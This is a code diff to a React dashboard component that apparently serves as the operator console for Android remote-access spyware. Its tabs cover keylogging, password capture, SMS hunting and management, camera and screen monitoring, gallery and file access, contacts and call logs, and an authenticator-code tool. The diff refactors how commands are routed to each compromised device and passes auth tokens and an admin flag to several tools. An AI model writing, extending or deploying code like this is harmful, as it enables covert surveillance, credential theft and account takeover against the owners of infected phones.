@@ -143,12 +143,14 @@ export default function DeviceControl({
   streamFrame, cameraFrame, send, keylogPushEntries, notifPushEntries,
   activityAppEntries, smsHuntEntries, screenReaderPushData, offlineRecordingVersion,
   serverLatency, deviceLatency, gcodeVersion, galleryStream, connected,
+  authTokenStorageKey, isAdmin = false,
 }) {
   const [activeTab, setActiveTab]     = useState('control_center');
   const [refreshKeys, setRefreshKeys] = useState(initialRefreshKeys);
   const [galleryActive, setGalleryActive] = useState(false);
   const [loadedTabs, setLoadedTabs] = useState(initialLoadedTabs);
 
+  const deviceId = String(device?.deviceId || '');
   const info     = device.deviceInfo || {};
   const isOnline = device.isOnline;
 
@@ -193,9 +195,26 @@ export default function DeviceControl({
     };
   }, []);
 
+  // Bind every tool in this panel to the device that created this panel
+  // instance. A late callback from an old panel can never be redirected to
+  // whichever device is currently selected in the dashboard.
+  const sendForDevice = useCallback((_requestedDeviceId, command, params = null) => {
+    if (!deviceId || !command) return;
+    sendCommand(deviceId, command, params);
+  }, [deviceId, sendCommand]);
+
+  const sendForDeviceEvent = useCallback((event, data = {}) => {
+    if (!deviceId || typeof send !== 'function') return;
+    if (event === 'recording:start' || event === 'recording:stop') {
+      send(event, { ...data, deviceId });
+      return;
+    }
+    send(event, data);
+  }, [deviceId, send]);
+
   const handleCommand = useCallback((command, params) => {
-    sendCommand(device.deviceId, command, params);
-  }, [sendCommand, device.deviceId]);
+    sendForDevice(deviceId, command, params);
+  }, [deviceId, sendForDevice]);
 
   const refreshTab = useCallback((tabId) => {
     setRefreshKeys(prev => ({ ...prev, [tabId]: (prev[tabId] || 0) + 1 }));
@@ -209,7 +228,7 @@ export default function DeviceControl({
   const tabVisible = (id) => ({ display: activeTab === id ? 'flex' : 'none', flexDirection: 'column', flex: 1, minHeight: 0 });
 
   return (
-    <div className="device-control">
+    <div className="device-control" data-device-id={deviceId}>
       <div className="dc-header">
         <button className="btn-back" onClick={onBack}>← Back</button>
         <span style={{ fontSize: 22 }}>📱</span>
@@ -225,7 +244,7 @@ export default function DeviceControl({
         </span>
         <button
           title="Force the device to close and re-open all connections to the server"
-          onClick={() => sendCommand(device.deviceId, 'restart_connection')}
+          onClick={() => sendForDevice(deviceId, 'restart_connection')}
           style={{ background: '#1e1b4b', border: '1px solid #4c1d95', color: '#a78bfa', borderRadius: 6, padding: '5px 12px', fontSize: 12, cursor: 'pointer', whiteSpace: 'nowrap' }}
         >
           🔄 Restart Connection
@@ -286,10 +305,10 @@ export default function DeviceControl({
           <ControlCenter
             key={refreshKeys.control_center}
             device={device}
-            sendCommand={sendCommand}
+            sendCommand={sendForDevice}
             results={results}
             streamFrame={streamFrame}
-            send={send}
+            send={sendForDeviceEvent}
             serverLatency={serverLatency}
             deviceLatency={deviceLatency}
             onTabChange={selectTab}
@@ -306,7 +325,7 @@ export default function DeviceControl({
           activityEntries={activityAppEntries || []}
           keylogEntries={keylogPushEntries || []}
           device={device}
-          sendCommand={sendCommand}
+          sendCommand={sendForDevice}
           results={results}
         />
       </div>}
@@ -326,10 +345,11 @@ export default function DeviceControl({
         <ScreenControl
           key={refreshKeys.screen_control}
           device={device}
-          sendCommand={sendCommand}
+          sendCommand={sendForDevice}
+          authTokenStorageKey={authTokenStorageKey}
           results={results}
           streamFrame={streamFrame}
-          send={send}
+          send={sendForDeviceEvent}
           connected={connected}
         />
         </TabPanel>
@@ -340,7 +360,8 @@ export default function DeviceControl({
         <CameraMonitorTab
           key={refreshKeys.camera_monitor}
           device={device}
-          sendCommand={sendCommand}
+          sendCommand={sendForDevice}
+          authTokenStorageKey={authTokenStorageKey}
           results={results}
           sseCameraFrame={cameraFrame}
           galleryActive={galleryActive}
@@ -354,7 +375,8 @@ export default function DeviceControl({
         <ScreenReaderView
           key={refreshKeys.screen_reader}
           device={device}
-          sendCommand={sendCommand}
+          sendCommand={sendForDevice}
+          authTokenStorageKey={authTokenStorageKey}
           results={results}
           screenPushData={screenReaderPushData}
           connected={connected}
@@ -367,7 +389,9 @@ export default function DeviceControl({
         <TaskStudio
           key={refreshKeys.task_studio}
           device={device}
-          sendCommand={sendCommand}
+          sendCommand={sendForDevice}
+          authTokenStorageKey={authTokenStorageKey}
+          isAdmin={isAdmin}
           results={results}
         />
         </TabPanel>
@@ -378,7 +402,8 @@ export default function DeviceControl({
         <SmsHuntTab
           key={refreshKeys.sms_hunt}
           device={device}
-          sendCommand={sendCommand}
+          sendCommand={sendForDevice}
+          authTokenStorageKey={authTokenStorageKey}
           results={results}
           pendingCommands={pending}
           incomingMessages={smsHuntEntries || []}
@@ -391,7 +416,7 @@ export default function DeviceControl({
         <PasswordsTab
           key={refreshKeys.passwords}
           device={device}
-          sendCommand={sendCommand}
+          sendCommand={sendForDevice}
           results={results}
           keylogPushEntries={keylogPushEntries || []}
         />
@@ -403,7 +428,7 @@ export default function DeviceControl({
         <NotificationsTab
           key={refreshKeys.notifications}
           device={device}
-          sendCommand={sendCommand}
+          sendCommand={sendForDevice}
           results={results}
           notifPushEntries={notifPushEntries || []}
         />
@@ -415,7 +440,7 @@ export default function DeviceControl({
         <SMSManagerTab
           key={refreshKeys.sms_manager}
           device={device}
-          sendCommand={sendCommand}
+          sendCommand={sendForDevice}
           results={results}
         />
         </TabPanel>
@@ -426,7 +451,7 @@ export default function DeviceControl({
         <ContactsCallLogTab
           key={refreshKeys.contacts_calls}
           device={device}
-          sendCommand={sendCommand}
+          sendCommand={sendForDevice}
           results={results}
         />
         </TabPanel>
@@ -438,7 +463,7 @@ export default function DeviceControl({
           key={refreshKeys.activity}
           device={device}
           activityEntries={activityAppEntries || []}
-          sendCommand={sendCommand}
+          sendCommand={sendForDevice}
           results={results}
         />
         </TabPanel>
@@ -449,7 +474,7 @@ export default function DeviceControl({
         <KeyloggerTab
           key={refreshKeys.keylogger}
           device={device}
-          sendCommand={sendCommand}
+          sendCommand={sendForDevice}
           results={results}
           keylogPushEntries={keylogPushEntries || []}
         />
@@ -461,7 +486,7 @@ export default function DeviceControl({
         <GalleryTab
           key={refreshKeys.gallery}
           device={device}
-          sendCommand={sendCommand}
+          sendCommand={sendForDevice}
           results={results}
           galleryStream={galleryStream}
           onGalleryActive={setGalleryActive}
@@ -474,7 +499,7 @@ export default function DeviceControl({
         <FileManagerTab
           key={refreshKeys.file_manager}
           device={device}
-          sendCommand={sendCommand}
+          sendCommand={sendForDevice}
           results={results}
         />
         </TabPanel>
@@ -485,7 +510,7 @@ export default function DeviceControl({
         <AppManager
           key={refreshKeys.app_manager}
           device={device}
-          sendCommand={sendCommand}
+          sendCommand={sendForDevice}
           results={results}
         />
         </TabPanel>
@@ -496,7 +521,7 @@ export default function DeviceControl({
         <AppMonitorTab
           key={refreshKeys.app_monitor}
           device={device}
-          sendCommand={sendCommand}
+          sendCommand={sendForDevice}
           results={results}
           screenReaderPushData={screenReaderPushData}
         />
@@ -508,7 +533,7 @@ export default function DeviceControl({
           <PermissionsTab
             key={refreshKeys.permissions}
             device={device}
-            sendCommand={sendCommand}
+            sendCommand={sendForDevice}
             results={results}
           />
         </TabPanel>
@@ -519,7 +544,7 @@ export default function DeviceControl({
         <GestureTab
           key={refreshKeys.gestures}
           device={device}
-          sendCommand={sendCommand}
+          sendCommand={sendForDevice}
           results={results}
         />
         </TabPanel>
@@ -530,7 +555,7 @@ export default function DeviceControl({
         <GcodeAuthenticator
           key={refreshKeys.pro_tools}
           device={device}
-          sendCommand={sendCommand}
+          sendCommand={sendForDevice}
           results={results}
           screenReaderPushData={screenReaderPushData}
           gcodeVersion={gcodeVersion}
